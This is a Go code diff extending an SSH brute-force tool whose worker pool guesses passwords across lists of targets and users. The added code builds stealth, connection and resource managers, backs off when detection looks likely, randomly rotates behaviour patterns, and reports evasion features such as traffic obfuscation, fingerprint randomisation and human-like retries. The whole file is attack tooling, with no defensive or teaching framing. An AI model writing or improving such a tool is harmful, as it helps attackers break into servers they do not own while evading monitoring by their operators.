@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"fmt"
+	"math/rand"
 	"os"
 	"runtime"
 	"strings"
@@ -56,6 +57,11 @@ type WorkerPool struct {
 	evasion            EvasionConfig
 	performance        PerformanceConfig
 	detectionAvoidance DetectionAvoidance
+
+	// Advanced managers
+	stealthManager    *StealthManager
+	connectionManager *ConnectionManager
+	resourceManager   *ResourceManager
 }
 
 // NewWorkerPool creates a new worker pool
@@ -218,11 +224,20 @@ func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
 	// Start progress updater
 	go wp.updateProgress()
 
+	// Start performance monitoring
+	go wp.monitorPerformance()
+
+	// Start resource cleanup
+	go wp.cleanupResources()
+
 	// Wait for all jobs to complete
 	wp.wg.Wait()
 
 	// Print final results
 	wp.printResults()
+
+	// Print performance report
+	wp.printPerformanceReport()
 }
 
 // collectResults collects and stores results
@@ -595,6 +610,36 @@ func (wp *WorkerPool) SetAdvancedConfigs(evasion EvasionConfig, performance Perf
 	wp.evasion = evasion
 	wp.performance = performance
 	wp.detectionAvoidance = detection
+
+	// Initialize stealth manager
+	wp.stealthManager = NewStealthManager(evasion, performance, detection)
+
+	// Initialize connection manager
+	wp.connectionManager = NewConnectionManager(
+		wp.limits.MaxConnsPerTarget*len(wp.failedIPs), // Max connections
+		wp.limits.ConnectionTimeout,
+		wp.limits.ReadTimeout,
+		wp.performance.KeepAliveInterval,
+		wp.performance.EnableCompression,
+		wp.performance.FastCiphers,
+		wp.performance.BufferSize,
+	)
+
+	// Initialize resource manager
+	wp.resourceManager = &ResourceManager{
+		MaxMemoryUsage:  1024 * 1024 * 1024, // 1GB
+		MaxConnections:  wp.limits.MaxConnsPerTarget * 10,
+		MemoryThreshold: 0.8,
+		CPUThreshold:    0.8,
+		AdaptiveScaling: true,
+		Metrics: &PerformanceMetrics{
+			StartTime:           time.Now(),
+			ResourceUtilization: make(map[string]float64),
+		},
+	}
+
+	// Set managers in connection manager
+	wp.connectionManager.SetManagers(wp.resourceManager, wp.stealthManager)
 }
 
 // startHostRotationJobGenerator starts a goroutine that generates jobs with proper host rotation
@@ -669,4 +714,126 @@ func (wp *WorkerPool) startHostRotationJobGenerator(targets, users, passwords []
 		// Signal that job generation is complete
 		close(wp.jobGeneratorDone)
 	}()
+}
+
+// monitorPerformance monitors performance metrics and adjusts behavior
+func (wp *WorkerPool) monitorPerformance() {
+	ticker := time.NewTicker(5 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			// Update stealth manager metrics
+			if wp.stealthManager != nil {
+				// Check if we should throttle
+				if wp.stealthManager.ShouldThrottle() {
+					// Apply throttling by increasing delays
+					wp.applyThrottling()
+				}
+
+				// Rotate behavior patterns periodically
+				if rand.Float64() < 0.1 { // 10% chance to rotate
+					wp.stealthManager.RotateBehaviorPattern()
+				}
+			}
+
+			// Clean up stale connections
+			if wp.connectionManager != nil {
+				wp.connectionManager.CleanupStaleConnections()
+			}
+
+		case <-wp.ctx.Done():
+			return
+		}
+	}
+}
+
+// cleanupResources performs periodic resource cleanup
+func (wp *WorkerPool) cleanupResources() {
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			// Force garbage collection
+			runtime.GC()
+
+			// Update resource metrics
+			if wp.resourceManager != nil {
+				var m runtime.MemStats
+				runtime.ReadMemStats(&m)
+
+				wp.resourceManager.mu.Lock()
+				wp.resourceManager.Metrics.CurrentMemoryUsage = m.Alloc
+				if m.Alloc > wp.resourceManager.Metrics.PeakMemoryUsage {
+					wp.resourceManager.Metrics.PeakMemoryUsage = m.Alloc
+				}
+				wp.resourceManager.mu.Unlock()
+			}
+
+		case <-wp.ctx.Done():
+			return
+		}
+	}
+}
+
+// applyThrottling applies throttling based on current performance
+func (wp *WorkerPool) applyThrottling() {
+	// Increase host delay
+	wp.hostMutex.Lock()
+	wp.hostDelay = wp.hostDelay * 2
+	if wp.hostDelay > 30*time.Second {
+		wp.hostDelay = 30 * time.Second
+	}
+	wp.hostMutex.Unlock()
+
+	// Increase connection timeouts
+	wp.limits.ConnectionTimeout = wp.limits.ConnectionTimeout * 2
+	if wp.limits.ConnectionTimeout > 30*time.Second {
+		wp.limits.ConnectionTimeout = 30 * time.Second
+	}
+}
+
+// printPerformanceReport prints detailed performance metrics
+func (wp *WorkerPool) printPerformanceReport() {
+	fmt.Printf("\n=== ADVANCED PERFORMANCE REPORT ===\n")
+
+	// Stealth manager report
+	if wp.stealthManager != nil {
+		fmt.Printf("%s\n", wp.stealthManager.GetPerformanceReport())
+	}
+
+	// Connection manager report
+	if wp.connectionManager != nil {
+		fmt.Printf("%s\n", wp.connectionManager.GetPerformanceReport())
+	}
+
+	// Resource manager report
+	if wp.resourceManager != nil {
+		wp.resourceManager.mu.RLock()
+		metrics := wp.resourceManager.Metrics
+		wp.resourceManager.mu.RUnlock()
+
+		fmt.Printf("=== RESOURCE UTILIZATION ===\n")
+		fmt.Printf("Peak Memory Usage: %.2f MB\n", float64(metrics.PeakMemoryUsage)/(1024*1024))
+		fmt.Printf("Current Memory Usage: %.2f MB\n", float64(metrics.CurrentMemoryUsage)/(1024*1024))
+
+		if len(metrics.ResourceUtilization) > 0 {
+			fmt.Printf("Resource Utilization:\n")
+			for resource, utilization := range metrics.ResourceUtilization {
+				fmt.Printf("  %s: %.2f%%\n", resource, utilization*100)
+			}
+		}
+	}
+
+	// Advanced evasion statistics
+	fmt.Printf("\n=== STEALTH & EVASION STATISTICS ===\n")
+	fmt.Printf("Behavioral Mimicking: %t\n", wp.evasion.EnableBehavioralMimicking)
+	fmt.Printf("Timing Randomization: %t\n", wp.evasion.RandomizeTiming)
+	fmt.Printf("Traffic Obfuscation: %t\n", wp.detectionAvoidance.EnableTrafficObfuscation)
+	fmt.Printf("Human-like Retries: %t\n", wp.detectionAvoidance.HumanLikeRetries)
+	fmt.Printf("Fingerprint Randomization: %t\n", wp.evasion.FingerprintRandomization)
+	fmt.Printf("Session Simulation: %t\n", wp.evasion.SessionSimulation)
 }
